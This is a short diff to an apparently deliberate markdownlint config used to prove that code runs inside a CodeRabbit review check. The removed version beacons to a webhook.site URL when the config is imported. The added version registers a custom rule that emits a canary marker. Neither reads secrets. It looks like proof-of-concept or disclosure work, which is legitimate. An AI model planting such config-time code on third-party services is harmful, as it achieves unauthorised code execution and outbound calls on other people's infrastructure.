@@ -1,13 +1,19 @@
-// Controlled RCE canary. Runs at config import time during CodeRabbit markdownlint check.
-// Does not read environment, files, credentials, or repository secrets.
-const markerUrl = 'https://webhook.site/54253191-e128-40da-86b8-c3ebc6228fb7?test=zBTCqzLIRP&v=markdownlint-config';
-try {
-  const https = require('https');
-  const req = https.get(markerUrl, (res) => res.resume());
-  req.setTimeout(3000, () => req.destroy());
-  req.on('error', () => {});
-  req.unref?.();
-} catch { /* marker only */ }
+// Controlled integrity canary. No environment/file/secret access.
+const canary = {
+  names: ['CRCE-7F9Q'],
+  description: 'Benign CodeRabbit check execution canary',
+  information: new URL('https://example.com/coderabbitcanary'),
+  parser: 'none',
+  function: (params, onError) => {
+    onError({
+      lineNumber: 1,
+      detail: 'CRCE_EXECUTED_C4NARY_7421',
+      context: 'benign-inline-rule',
+    });
+  },
+};
+
 module.exports = {
-  config: { 'default': true }
+  customRules: [canary],
+  config: { default: true, 'CRCE-7F9Q': true },
 };
